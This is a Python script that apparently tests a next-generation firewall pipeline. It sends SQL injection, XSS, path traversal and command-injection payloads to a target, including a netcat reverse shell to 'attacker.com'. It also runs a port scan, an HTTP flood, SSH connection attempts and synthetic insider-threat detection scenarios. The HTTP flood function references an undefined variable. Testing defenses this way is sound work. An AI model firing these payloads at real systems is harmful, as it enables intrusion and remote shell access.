#!/usr/bin/env python3
"""
NGFW Attack Test Script - Tests the pipeline with various attack simulations

This script sends attack traffic to test if the NGFW pipeline detects and blocks it.
Supports both network attacks and ML-based insider threat detection testing.
"""

import argparse
import time
import socket
import random
import sys
import os
import json
from datetime import datetime, timezone
from pathlib import Path
from typing import List, Tuple, Dict, Any
from dataclasses import asdict

# Add the script directory to Python path to allow imports
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
if SCRIPT_DIR not in sys.path:
    sys.path.insert(0, SCRIPT_DIR)

# Try importing requests
try:
    import requests
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False
    print("Note: 'requests' not installed. HTTP attacks will be limited.")
    print("Install with: pip install requests")

# Try importing ML model manager
try:
    from ml_model_manager import get_model_manager
    ML_AVAILABLE = True
except ImportError as e:
    ML_AVAILABLE = False
    print(f"Note: ML model manager not available - {e}")
    print("Make sure ml_model_manager.py is in the same directory as attack_test.py")

# Try importing UBA engine
try:
    from uba_engine import get_uba_engine
    UBA_AVAILABLE = True
except ImportError as e:
    UBA_AVAILABLE = False
    print(f"Note: UBA engine not available - {e}")
    print("Make sure uba_engine.py is in the same directory as attack_test.py")

# Try importing ETA engine
try:
    from eta_engine import get_eta_engine
    ETA_AVAILABLE = True
except ImportError as e:
    ETA_AVAILABLE = False
    print(f"Note: ETA engine not available - {e}")
    print("Make sure eta_engine.py is in the same directory as attack_test.py")


class AttackTester:
    """Simple attack tester for NGFW pipeline"""
    
    def __init__(self, target: str, dry_run: bool = False):
        self.target = target
        self.dry_run = dry_run
        self.results: List[Tuple[str, str, str]] = []  # (name, status, details)
        self.ml_results = []  # ML prediction results
    
    def log(self, attack: str, status: str, details: str = ""):
        """Log attack result"""
        emoji = "✅" if status == "SENT" else "❌" if status == "ERROR" else "⏭️"
        print(f"  {emoji} {attack}: {status} {details}")
        self.results.append((attack, status, details))
    
    # ========== SQL Injection ==========
    def test_sqli(self):
        """Test SQL injection detection"""
        print("\n[SQL Injection Tests]")
        
        if not REQUESTS_AVAILABLE:
            self.log("SQL Injection", "SKIPPED", "requests not installed")
            return
        
        payloads = [
            "' OR '1'='1",
            "1; DROP TABLE users--",
            "' UNION SELECT * FROM users--",
            "admin'--",
            "1' AND SLEEP(5)--"
        ]
        
        for payload in payloads:
            if self.dry_run:
                self.log(f"SQLi: {payload[:30]}", "DRY_RUN")
                continue
            
            try:
                url = f"http://{self.target}/?id={payload}"
                requests.get(url, timeout=3)
                self.log(f"SQLi: {payload[:30]}", "SENT")
            except requests.exceptions.ConnectionError:
                self.log(f"SQLi: {payload[:30]}", "BLOCKED", "Connection refused")
            except Exception as e:
                self.log(f"SQLi: {payload[:30]}", "ERROR", str(e)[:50])
            
            time.sleep(0.3)
    
    # ========== XSS ==========
    def test_xss(self):
        """Test XSS detection"""
        print("\n[XSS Tests]")
        
        if not REQUESTS_AVAILABLE:
            self.log("XSS", "SKIPPED", "requests not installed")
            return
        
        payloads = [
            "<script>alert('xss')</script>",
            "<img src=x onerror=alert('xss')>",
            "javascript:alert('xss')",
            "<svg onload=alert('xss')>",
        ]
        
        for payload in payloads:
            if self.dry_run:
                self.log(f"XSS: {payload[:30]}", "DRY_RUN")
                continue
            
            try:
                url = f"http://{self.target}/?q={payload}"
                requests.get(url, timeout=3)
                self.log(f"XSS: {payload[:30]}", "SENT")
            except requests.exceptions.ConnectionError:
                self.log(f"XSS: {payload[:30]}", "BLOCKED", "Connection refused")
            except Exception as e:
                self.log(f"XSS: {payload[:30]}", "ERROR", str(e)[:50])
            
            time.sleep(0.3)
    
    # ========== Path Traversal ==========
    def test_path_traversal(self):
        """Test path traversal detection"""
        print("\n[Path Traversal Tests]")
        
        if not REQUESTS_AVAILABLE:
            self.log("Path Traversal", "SKIPPED", "requests not installed")
            return
        
        payloads = [
            "../../../etc/passwd",
            "....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2fetc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
        ]
        
        for payload in payloads:
            if self.dry_run:
                self.log(f"Traversal: {payload[:30]}", "DRY_RUN")
                continue
            
            try:
                url = f"http://{self.target}/file?path={payload}"
                requests.get(url, timeout=3)
                self.log(f"Traversal: {payload[:30]}", "SENT")
            except requests.exceptions.ConnectionError:
                self.log(f"Traversal: {payload[:30]}", "BLOCKED", "Connection refused")
            except Exception as e:
                self.log(f"Traversal: {payload[:30]}", "ERROR", str(e)[:50])
            
            time.sleep(0.3)
    
    # ========== Command Injection ==========
    def test_command_injection(self):
        """Test command injection detection"""
        print("\n[Command Injection Tests]")
        
        if not REQUESTS_AVAILABLE:
            self.log("Command Injection", "SKIPPED", "requests not installed")
            return
        
        payloads = [
            "; ls -la",
            "| cat /etc/passwd",
            "`whoami`",
            "$(nc -e /bin/sh attacker.com 4444)",
        ]
        
        for payload in payloads:
            if self.dry_run:
                self.log(f"CmdInj: {payload[:30]}", "DRY_RUN")
                continue
            
            try:
                url = f"http://{self.target}/exec?cmd={payload}"
                requests.get(url, timeout=3)
                self.log(f"CmdInj: {payload[:30]}", "SENT")
            except requests.exceptions.ConnectionError:
                self.log(f"CmdInj: {payload[:30]}", "BLOCKED", "Connection refused")
            except Exception as e:
                self.log(f"CmdInj: {payload[:30]}", "ERROR", str(e)[:50])
            
            time.sleep(0.3)
    
    # ========== Port Scan ==========
    def test_port_scan(self, ports: int = 20):
        """Test port scan detection"""
        print(f"\n[Port Scan Test - {ports} ports]")
        
        if self.dry_run:
            self.log(f"Port Scan ({ports} ports)", "DRY_RUN")
            return
        
        open_ports = 0
        for port in random.sample(range(1, 1025), ports):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.5)
                result = sock.connect_ex((self.target, port))
                if result == 0:
                    open_ports += 1
                sock.close()
            except:
                pass
            time.sleep(0.05)
        
        self.log(f"Port Scan ({ports} ports)", "SENT", f"{open_ports} open")
    
    # ========== HTTP Flood ==========
    def test_http_flood(self, count: int = 30):
        """Test HTTP flood detection"""
        print(f"\n[HTTP Flood Test - {count} requests]")
        
        if not REQUESTS_AVAILABLE:
            self.log("HTTP Flood", "SKIPPED", "requests not installed")
            return
        
        if self.dry_run:
            self.log(f"HTTP Flood ({count} req)", "DRY_RUN")
            return
        
        success = 0
        blocked = 0
        
        for i in range(count):
            try:
                requests.get(f"http://{self.target}/?flood={i}", timeout=2)
                success += 1
            except requests.exceptions.ConnectionError:
                blocked += 1
            except:
                pass
        
        self.log(f"SSH Bruteforce ({attempts})", "SENT", f"{success} conn, {blocked} blocked")
    
    # ========== ML-Based Insider Threat Testing ==========
    def test_ml_insider_threats(self):
        """Test real trained ML model with insider threat scenarios"""
        print("\n[ML Insider Threat Detection - Real Model Testing]")
        
        try:
            from model_loader import load_ml_model, get_ml_predictions
        except ImportError:
            self.log("ML Testing", "ERROR", "model_loader.py not found")
            return
        
        # Load the real trained model
        ml_model = load_ml_model("ml_models/deep_insider_threat_model.pkl")
        if ml_model is None:
            self.log("ML Testing", "ERROR", "Failed to load trained model")
            return
        
        manager = get_model_manager()
        
        if not manager.models:
            self.log("ML Testing", "SKIPPED", "No ML models loaded")
            return
        
        print(f"  Models available: {list(manager.models.keys())}")
        
        # CERT Dataset based test scenarios
        test_cases = [
            {
                "name": "Normal Business Hours Activity",
                "data": {
                    "user_id": "ACM2278",
                    "hour_of_day": 14,
                    "day_of_week": 2,
                    "is_after_hours": 0,
                    "is_weekend": 0,
                    "activity_type": "Logon",
                    "pc_id": "PC-1234",
                    "src_ip": "192.168.1.100",
                    "dest_ip": "192.168.1.1",
                    "bytes_sent": 1024,
                    "bytes_received": 2048,
                    "device_connected": 0,
                    "email_external": 0,
                    "data_upload": 0,
                },
                "expected": "normal"
            },
            {
                "name": "After Hours File Access",
                "data": {
                    "user_id": "ABCD1234",
                    "hour_of_day": 23,
                    "day_of_week": 5,
                    "is_after_hours": 1,
                    "is_weekend": 0,
                    "activity_type": "FileAccess",
                    "pc_id": "PC-5678",
                    "src_ip": "192.168.1.105",
                    "dest_ip": "192.168.1.1",
                    "bytes_sent": 5120,
                    "bytes_received": 10240,
                    "device_connected": 0,
                    "email_external": 0,
                    "data_upload": 0,
                },
                "expected": "suspicious"
            },
            {
                "name": "USB Device Connection + Large Upload",
                "data": {
                    "user_id": "XYZ9999",
                    "hour_of_day": 18,
                    "day_of_week": 4,
                    "is_after_hours": 1,
                    "is_weekend": 0,
                    "activity_type": "DeviceConnect",
                    "pc_id": "PC-9999",
                    "src_ip": "192.168.1.110",
                    "dest_ip": "192.168.1.1",
                    "bytes_sent": 52428800,  # 50MB
                    "bytes_received": 1024,
                    "device_connected": 1,
                    "email_external": 0,
                    "data_upload": 52428800,
                },
                "expected": "threat"
            },
            {
                "name": "External Email with Large Attachment",
                "data": {
                    "user_id": "MAIL5555",
                    "hour_of_day": 16,
                    "day_of_week": 1,
                    "is_after_hours": 0,
                    "is_weekend": 0,
                    "activity_type": "Email",
                    "pc_id": "PC-4444",
                    "src_ip": "192.168.1.115",
                    "dest_ip": "192.168.1.1",
                    "bytes_sent": 20971520,  # 20MB
                    "bytes_received": 2048,
                    "device_connected": 0,
                    "email_external": 1,
                    "data_upload": 20971520,
                },
                "expected": "suspicious"
            },
            {
                "name": "Weekend Large Data Upload",
                "data": {
                    "user_id": "WEEKEND777",
                    "hour_of_day": 10,
                    "day_of_week": 6,
                    "is_after_hours": 0,
                    "is_weekend": 1,
                    "activity_type": "DataTransfer",
                    "pc_id": "PC-7777",
                    "src_ip": "192.168.1.120",
                    "dest_ip": "192.168.1.1",
                    "bytes_sent": 104857600,  # 100MB
                    "bytes_received": 1024,
                    "device_connected": 0,
                    "email_external": 0,
                    "data_upload": 104857600,
                },
                "expected": "threat"
            },
            {
                "name": "Midnight Access with Device Connection",
                "data": {
                    "user_id": "NIGHT8888",
                    "hour_of_day": 0,
                    "day_of_week": 3,
                    "is_after_hours": 1,
                    "is_weekend": 0,
                    "activity_type": "Logon",
                    "pc_id": "PC-8888",
                    "src_ip": "192.168.1.125",
                    "dest_ip": "192.168.1.1",
                    "bytes_sent": 2048,
                    "bytes_received": 4096,
                    "device_connected": 1,
                    "email_external": 0,
                    "data_upload": 0,
                },
                "expected": "suspicious"
            }
        ]
        
        print(f"\n  Testing {len(test_cases)} scenarios:\n")
        
        threats_detected = 0
        
        for test_case in test_cases:
            name = test_case["name"]
            data = test_case["data"]
            expected = test_case["expected"]
            
            # Run all models
            predictions = manager.predict_all(data, data_type="insider")
            
            is_threat = False
            threats = []
            
            for model_name, pred in predictions.items():
                if pred and pred.is_threat:
                    is_threat = True
                    threats.append(f"{model_name}({pred.confidence:.1%})")
            
            # Log result
            if is_threat:
                threats_detected += 1
                status = "🚨 THREAT"
                details = f"Detected: {', '.join(threats)}"
                self.log(f"ML: {name}", status, details)
            else:
                status = "✓ Normal"
                details = "No threat detected"
                self.log(f"ML: {name}", status, details)
            
            # Store ML result
            self.ml_results.append({
                "timestamp": datetime.now(timezone.utc).isoformat(),
                "test_case": name,
                "expected": expected,
                "is_threat": is_threat,
                "predictions": {
                    name: asdict(pred) if pred else None 
                    for name, pred in predictions.items()
                } if predictions else {},
                "user_id": data.get("user_id"),
                "features": data
            })
            
            time.sleep(0.2)
        
        print(f"\n  Results: {threats_detected}/{len(test_cases)} threats detected")
        
        # Save ML test results
        try:
            results_file = Path("logs/ml_test_results.json")
            results_file.parent.mkdir(parents=True, exist_ok=True)
            # Try to write with error handling
            with open(results_file, 'a') as f:
                for result in self.ml_results:
                    f.write(json.dumps(result) + '\n')
            print(f"  Results saved to: {results_file}")
        except PermissionError:
            print(f"  Warning: Could not write to {results_file} (permission denied)")
        except Exception as e:
            print(f"  Warning: Error saving results: {e}")
    
    # ========== SSH Bruteforce (simulated) ==========
    def test_ssh_bruteforce(self, attempts: int = 10):
        """Test SSH bruteforce detection"""
        print(f"\n[SSH Bruteforce Test - {attempts} attempts]")
        
        if self.dry_run:
            self.log(f"SSH Bruteforce ({attempts})", "DRY_RUN")
            return
        

        success = 0
        blocked = 0
        
        for i in range(attempts):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                sock.connect((self.target, 22))
                sock.send(b"SSH-2.0-Test\r\n")
                sock.recv(256)
                sock.close()
                success += 1
            except (ConnectionRefusedError, socket.timeout):
                blocked += 1
            except:
                pass
            time.sleep(0.5)
        
        self.log(f"SSH Bruteforce ({attempts})", "SENT", f"{success} conn, {blocked} blocked")
    
    # ========== UBA (User Behavior Analytics) Testing ==========
    def test_uba_insider_threats(self):
        """Test UBA engine with insider threat scenarios"""
        print("\n[UBA Insider Threat Detection Tests]")
        
        if not UBA_AVAILABLE:
            self.log("UBA Testing", "SKIPPED", 
                     "UBA engine not available - check uba_engine.py")
            return
        
        try:
            uba = get_uba_engine()
        except Exception as e:
            self.log("UBA Testing", "ERROR", f"Failed to initialize: {str(e)[:50]}")
            return
        
        print(f"  UBA Engine Status: ✅ Initialized")
        print(f"  Users monitored: {uba.users_monitored}")
        
        # UBA test scenarios (user behavior patterns)
        test_scenarios = [
            {
                "name": "Normal Daytime Logon",
                "user_id": "john_doe",
                "events": [
                    {"user_id": "john_doe", "event_type": "logon", "timestamp": "2025-12-07T09:00:00Z"},
                    {"user_id": "john_doe", "event_type": "file", "destination": "local", "timestamp": "2025-12-07T09:30:00Z"},
                ],
                "expected_risk": "low"
            },
            {
                "name": "After-Hours USB Transfer (Suspicious)",
                "user_id": "suspicious_bob",
                "events": [
                    {"user_id": "suspicious_bob", "event_type": "logon", "timestamp": "2025-12-07T23:00:00Z"},
                    {"user_id": "suspicious_bob", "event_type": "file", "destination": "usb", "timestamp": "2025-12-07T23:05:00Z"},
                ],
                "expected_risk": "high"
            },
            {
                "name": "Night Logon + Large Upload (Critical)",
                "user_id": "data_thief_alice",
                "events": [
                    {"user_id": "data_thief_alice", "event_type": "logon", "timestamp": "2025-12-07T22:00:00Z"},
                    {"user_id": "data_thief_alice", "event_type": "file", "destination": "usb", "data_size": 5368709120, "is_upload": True, "timestamp": "2025-12-07T22:15:00Z"},
                ],
                "expected_risk": "critical"
            },
            {
                "name": "Weekend Work Activity",
                "user_id": "weekend_charlie",
                "events": [
                    {"user_id": "weekend_charlie", "event_type": "logon", "timestamp": "2025-12-05T10:00:00Z"},  # Saturday
                    {"user_id": "weekend_charlie", "event_type": "file", "destination": "local", "timestamp": "2025-12-05T10:30:00Z"},
                ],
                "expected_risk": "low"
            },
            {
                "name": "External Email with Attachment",
                "user_id": "email_user",
                "events": [
                    {"user_id": "email_user", "event_type": "email", "is_external": True, "timestamp": "2025-12-07T14:00:00Z"},
                    {"user_id": "email_user", "event_type": "email", "is_external": True, "timestamp": "2025-12-07T14:05:00Z"},
                ],
                "expected_risk": "medium"
            },
            {
                "name": "Device Connection Anomaly",
                "user_id": "device_user",
                "events": [
                    {"user_id": "device_user", "event_type": "device", "device_type": "USB_DRIVE", "timestamp": "2025-12-07T15:00:00Z"},
                    {"user_id": "device_user", "event_type": "device", "device_type": "EXTERNAL_PHONE", "timestamp": "2025-12-07T15:05:00Z"},
                    {"user_id": "device_user", "event_type": "device", "device_type": "EXTERNAL_PRINTER", "timestamp": "2025-12-07T15:10:00Z"},
                ],
                "expected_risk": "medium"
            }
        ]
        
        print(f"\n  Testing {len(test_scenarios)} user behavior scenarios:\n")
        
        alerts_generated = 0
        high_risk_count = 0
        
        for scenario in test_scenarios:
            scenario_name = scenario["name"]
            user_id = scenario["user_id"]
            expected_risk = scenario["expected_risk"]
            
            print(f"  Scenario: {scenario_name}")
            
            scenario_alerts = []
            max_risk = 0.0
            
            for event in scenario["events"]:
                alert = uba.update_user_state(event)
                if alert:
                    scenario_alerts.append(alert)
            
            # Get user profile
            profile = uba.get_user_profile(user_id)
            if profile:
                max_risk = profile.get('risk_score', 0.0)
            
            # Determine status
            if scenario_alerts:
                alerts_generated += len(scenario_alerts)
                severity = scenario_alerts[0].severity
                
                if severity == "CRITICAL":
                    high_risk_count += 1
                    status = "🚨 CRITICAL"
                elif severity == "HIGH":
                    high_risk_count += 1
                    status = "⚠️ HIGH"
                else:
                    status = "⚡ MEDIUM"
                
                threat = scenario_alerts[0].threat_indicator
                self.log(f"  {scenario_name}", status, threat)
            else:
                if max_risk >= 0.7:
                    status = "⚠️ HIGH RISK"
                    high_risk_count += 1
                elif max_risk >= 0.4:
                    status = "⚡ MEDIUM RISK"
                else:
                    status = "✓ LOW RISK"
                
                self.log(f"  {scenario_name}", status, f"Risk: {max_risk:.2f}")
            
            time.sleep(0.1)
        
        # Get final statistics
        uba_stats = uba.get_stats()
        high_risk_users = uba.get_high_risk_users(threshold=0.6)
        
        print(f"\n  Results: {alerts_generated} alerts generated, {high_risk_count} high-risk scenarios")
        print(f"  Users monitored: {uba_stats['users_monitored']}")
        print(f"  Total events: {uba_stats['total_events_processed']}")
        print(f"  High-risk users: {len(high_risk_users)}")
        
        # Save UBA test results
        uba_test_results = {
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "scenarios_tested": len(test_scenarios),
            "alerts_generated": alerts_generated,
            "high_risk_scenarios": high_risk_count,
            "stats": uba_stats,
            "high_risk_users": [u['user_id'] for u in high_risk_users]
        }
        
        try:
            results_file = Path("logs/uba_test_results.json")
            results_file.parent.mkdir(parents=True, exist_ok=True)
            with open(results_file, 'w') as f:
                json.dump(uba_test_results, f, indent=2)
            print(f"  Results saved to: {results_file}\n")
        except PermissionError:
            print(f"  Warning: Could not write to logs/uba_test_results.json (permission denied)\n")
        except Exception as e:
            print(f"  Warning: Error saving results: {e}\n")
    
    # ========== ETA (Encrypted Traffic Analysis) Testing ==========
    def test_eta_encrypted_threats(self):
        """Test ETA engine with encrypted traffic threat scenarios"""
        print("\n[ETA Encrypted Traffic Analysis Tests]")
        
        if not ETA_AVAILABLE:
            self.log("ETA Testing", "SKIPPED", 
                     "ETA engine not available - check eta_engine.py")
            return
        
        try:
            eta = get_eta_engine()
        except Exception as e:
            self.log("ETA Testing", "ERROR", f"Failed to initialize: {str(e)[:50]}")
            return
        
        print(f"  ETA Engine Status: ✅ Initialized")
        
        # ETA test scenarios (encrypted traffic patterns)
        test_scenarios = [
            {
                "name": "Normal HTTPS Traffic",
                "flow": {
                    "src_port": 54322, "dest_port": 443, "protocol": "tcp",
                    "duration": 12.5, "bytes_toserver": 1500, "bytes_toclient": 35000,
                    "packets_toserver": 20, "packets_toclient": 35,
                    "total_bytes": 36500, "total_packets": 55, "bytes_per_packet": 663.6
                },
                "expected": "benign"
            },
            {
                "name": "Data Exfiltration via HTTPS (Large Transfer)",
                "flow": {
                    "src_port": 49152, "dest_port": 443, "protocol": "tcp",
                    "duration": 150.2, "bytes_toserver": 5000, "bytes_toclient": 950000000,
                    "packets_toserver": 50, "packets_toclient": 9000,
                    "total_bytes": 950005000, "total_packets": 9050, "bytes_per_packet": 104972.9
                },
                "expected": "malicious"
            },
            {
                "name": "Port Scan via Encrypted Channel",
                "flow": {
                    "src_port": 55555, "dest_port": 80, "protocol": "tcp",
                    "duration": 0.1, "bytes_toserver": 0, "bytes_toclient": 0,
                    "packets_toserver": 2, "packets_toclient": 0,
                    "total_bytes": 0, "total_packets": 2, "bytes_per_packet": 0
                },
                "expected": "malicious"
            },
            {
                "name": "C2 Communication (Low Volume, Long Duration)",
                "flow": {
                    "src_port": 45000, "dest_port": 443, "protocol": "tcp",
                    "duration": 3600.0, "bytes_toserver": 250, "bytes_toclient": 500,
                    "packets_toserver": 5, "packets_toclient": 8,
                    "total_bytes": 750, "total_packets": 13, "bytes_per_packet": 57.7
                },
                "expected": "benign"
            },
            {
                "name": "Suspicious High Volume HTTPS",
                "flow": {
                    "src_port": 52000, "dest_port": 443, "protocol": "tcp",
                    "duration": 45.0, "bytes_toserver": 500000000, "bytes_toclient": 100000,
                    "packets_toserver": 5000, "packets_toclient": 50,
                    "total_bytes": 500100000, "total_packets": 5050, "bytes_per_packet": 99010.9
                },
                "expected": "malicious"
            }
        ]
        
        print(f"\n  Testing {len(test_scenarios)} encrypted traffic scenarios:\n")
        
        threats_detected = 0
        benign_detected = 0
        
        for scenario in test_scenarios:
            scenario_name = scenario["name"]
            flow_data = scenario["flow"]
            expected = scenario["expected"]
            
            analysis = eta.analyze_flow(flow_data)
            
            if analysis:
                if analysis.is_threat:
                    threats_detected += 1
                    status = f"🔴 {analysis.prediction.upper()}"
                    details = f"Confidence: {analysis.confidence:.2%}"
                else:
                    benign_detected += 1
                    status = "🟢 BENIGN"
                    details = f"Confidence: {analysis.confidence:.2%}"
                
                self.log(f"  {scenario_name}", status, details)
            else:
                self.log(f"  {scenario_name}", "ERROR", "Failed to analyze")
            
            time.sleep(0.1)
        
        # Get statistics
        eta_stats = eta.get_stats()
        
        print(f"\n  Results: {threats_detected} threats, {benign_detected} benign")
        print(f"  Total Analyses: {eta_stats['analyses_count']}")
        print(f"  Threat Rate: {eta_stats['threat_rate']:.2%}")
        
        # Save ETA test results
        eta_test_results = {
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "scenarios_tested": len(test_scenarios),
            "threats_detected": threats_detected,
            "benign_detected": benign_detected,
            "stats": eta_stats
        }
        
        try:
            results_file = Path("logs/eta_test_results.json")
            results_file.parent.mkdir(parents=True, exist_ok=True)
            with open(results_file, 'w') as f:
                json.dump(eta_test_results, f, indent=2)
            print(f"  Results saved to: {results_file}\n")
        except PermissionError:
            print(f"  Warning: Could not write to logs/eta_test_results.json (permission denied)\n")
        except Exception as e:
            print(f"  Warning: Error saving results: {e}\n")
    
    def run_all(self, safe_mode: bool = True):
        """Run all tests"""
        print("=" * 50)
        print("NGFW Attack Test Suite")
        print("=" * 50)
        print(f"Target: {self.target}")
        print(f"Mode: {'SAFE (web only)' if safe_mode else 'FULL (all attacks)'}")
        print(f"Dry Run: {self.dry_run}")
        print("=" * 50)
        
        # Web application attacks (safe)
        self.test_sqli()
        self.test_xss()
        self.test_path_traversal()
        self.test_command_injection()
        
        if not safe_mode:
            # Network attacks
            self.test_port_scan()
            self.test_http_flood()
            self.test_ssh_bruteforce()
        
        # Summary
        print("\n" + "=" * 50)
        print("SUMMARY")
        print("=" * 50)
        
        sent = sum(1 for _, s, _ in self.results if s == "SENT")
        blocked = sum(1 for _, s, _ in self.results if s == "BLOCKED")
        errors = sum(1 for _, s, _ in self.results if s == "ERROR")
        skipped = sum(1 for _, s, _ in self.results if s in ("SKIPPED", "DRY_RUN"))
        
        print(f"  Attacks sent: {sent}")
        print(f"  Blocked: {blocked}")
        print(f"  Errors: {errors}")
        print(f"  Skipped: {skipped}")
        print("")
        print("Check logs/soar_actions.log for SOAR responses")
        print("Check logs/reports/ for detailed attack reports")


def auto_detect_target_ip():
    """
    Auto-detect the local IP address for testing.
    Uses multiple methods for reliability.
    """
    import subprocess
    import re
    
    # Method 1: Try using our network_utils module
    try:
        from network_utils import get_local_ip
        ip = get_local_ip()
        if ip and ip != '127.0.0.1':
            return ip
    except ImportError:
        pass
    
    # Method 2: Get IP from default route interface
    try:
        result = subprocess.run(
            "ip route show default 2>/dev/null | grep -oP 'dev\\s+\\K\\S+'",
            shell=True, capture_output=True, text=True
        )
        interface = result.stdout.strip()
        
        if interface:
            result = subprocess.run(
                f"ip -4 addr show {interface} 2>/dev/null | grep -oP '(?<=inet\\s)\\d+(\\.\\d+){{3}}'",
                shell=True, capture_output=True, text=True
            )
            ip = result.stdout.strip().split('\n')[0]
            if ip and ip != '127.0.0.1':
                return ip
    except Exception:
        pass
    
    # Method 3: Connect to external server to determine local IP
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        if ip and ip != '127.0.0.1':
            return ip
    except Exception:
        pass
    
    # Method 4: hostname -I
    try:
        result = subprocess.run("hostname -I 2>/dev/null", shell=True, capture_output=True, text=True)
        ips = result.stdout.strip().split()
        for ip in ips:
            if ip and not ip.startswith('127.'):
                return ip
    except Exception:
        pass
    
    # Fallback
    return '127.0.0.1'


def main():
    parser = argparse.ArgumentParser(
        description="NGFW Attack Tester (Network + ML + UBA)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Auto-detect target and run full test
  python3 attack_test.py --full
  
  # Specify target manually
  python3 attack_test.py --target 192.168.1.100 --full
  
  # Run only SQL injection tests
  python3 attack_test.py --sqli
  
  # Run ML insider threat detection
  python3 attack_test.py --ml

Note: If --target is not specified, the local IP will be auto-detected.
        """
    )
    parser.add_argument("--target", required=False, help="Target IP address (auto-detected if not provided)")
    parser.add_argument("--safe", action="store_true", help="Safe mode (web attacks only)")
    parser.add_argument("--full", action="store_true", help="Full mode (all attacks)")
    parser.add_argument("--ml", action="store_true", help="ML insider threat detection test (CERT dataset)")
    parser.add_argument("--uba", action="store_true", help="UBA user behavior analytics test")
    parser.add_argument("--eta", action="store_true", help="ETA encrypted traffic analysis test")
    parser.add_argument("--dry-run", action="store_true", help="Don't send actual attacks")
    
    # Individual attack options
    parser.add_argument("--sqli", action="store_true", help="SQL injection only")
    parser.add_argument("--xss", action="store_true", help="XSS only")
    parser.add_argument("--traversal", action="store_true", help="Path traversal only")
    parser.add_argument("--cmdi", action="store_true", help="Command injection only")
    parser.add_argument("--portscan", action="store_true", help="Port scan only")
    parser.add_argument("--flood", action="store_true", help="HTTP flood only")
    parser.add_argument("--ssh", action="store_true", help="SSH bruteforce only")
    
    args = parser.parse_args()
    
    # Auto-detect target if not provided
    if args.target:
        target = args.target
        print(f"Using specified target: {target}")
    else:
        target = auto_detect_target_ip()
        print(f"Auto-detected target IP: {target}")
    
    tester = AttackTester(target, dry_run=args.dry_run)
    
    # Check for individual attack flags
    individual = args.sqli or args.xss or args.traversal or args.cmdi or args.portscan or args.flood or args.ssh or args.ml or args.uba or args.eta
    
    if args.ml:
        # ML Testing mode
        print("=" * 60)
        print("NGFW ML Insider Threat Detection Test")
        print("=" * 60)
        print("Using CERT Dataset Scenarios")
        print("=" * 60)
        tester.test_ml_insider_threats()
        
        # Print summary
        print("\n" + "=" * 60)
        print("ML TEST SUMMARY")
        print("=" * 60)
        if tester.ml_results:
            threats = sum(1 for r in tester.ml_results if r['is_threat'])
            normal = len(tester.ml_results) - threats
            print(f"  Scenarios tested: {len(tester.ml_results)}")
            print(f"  Threats detected: {threats}")
            print(f"  Normal activity: {normal}")
            print(f"\nResults saved to: logs/ml_test_results.json")
        print("")
    
    elif args.uba:
        # UBA Testing mode
        print("=" * 60)
        print("NGFW UBA User Behavior Analytics Test")
        print("=" * 60)
        print("Detecting Insider Threats via Behavior Analysis")
        print("=" * 60)
        tester.test_uba_insider_threats()
        
        print("\n" + "=" * 60)
        print("UBA TEST COMPLETE")
        print("=" * 60)
        print("  Check logs/uba_test_results.json for detailed results")
        print("  Check logs/uba_alerts.json for generated alerts")
        print("")
    
    elif args.eta:
        # ETA Testing mode
        print("=" * 60)
        print("NGFW ETA Encrypted Traffic Analysis Test")
        print("=" * 60)
        print("Detecting Threats in Encrypted Network Flows")
        print("=" * 60)
        tester.test_eta_encrypted_threats()
        
        print("\n" + "=" * 60)
        print("ETA TEST COMPLETE")
        print("=" * 60)
        print("  Check logs/eta_test_results.json for detailed results")
        print("  Check logs/eta_alerts.json for generated alerts")
        print("")
    
    elif individual:
        print("=" * 50)
        print("NGFW Attack Test - Individual Tests")
        print("=" * 50)
        print(f"Target: {target}")
        
        if args.sqli:
            tester.test_sqli()
        if args.xss:
            tester.test_xss()
        if args.traversal:
            tester.test_path_traversal()
        if args.cmdi:
            tester.test_command_injection()
        if args.portscan:
            tester.test_port_scan()
        if args.flood:
            tester.test_http_flood()
        if args.ssh:
            tester.test_ssh_bruteforce()
    else:
        safe_mode = not args.full
        tester.run_all(safe_mode=safe_mode)


if __name__ == "__main__":
    main()
